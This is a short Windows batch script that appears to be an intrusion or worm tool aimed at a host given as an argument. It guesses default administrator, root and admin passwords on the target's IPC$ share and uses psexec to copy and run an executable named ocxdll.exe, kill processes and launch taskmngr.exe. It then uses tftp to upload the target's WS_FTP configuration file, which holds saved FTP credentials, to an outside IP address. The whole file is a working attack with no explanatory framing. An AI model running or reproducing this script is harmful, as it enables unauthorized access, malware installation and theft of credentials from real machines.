@echo off
net use /del \\%1\ipc$
net use \\%1\ipc$ "" /user:administrator
net use \\%1\ipc$ "administrator" /user:administrator
net use \\%1\ipc$ "root" /user:root
net use \\%1\ipc$ "admin" /user:admin
psexec \\%1 attrib.exe -r ocxdll.exe
psexec \\%1 -d kill.exe temp.exe
psexec \\%1 -f -c -d ocxdll.exe -o
psexec \\%1 -d ocxdll.exe -o
psexec \\%1 -d kill.exe mt.exe
psexec \\%1 -d taskmngr.exe
psexec \\%1 c:\winnt\system32\tftp -i 12.233.13.31 PUT c:\progra~1\ws_ftp\ws_ftp.ini w%1.ini
psexec \\%1 -d taskmngr.exe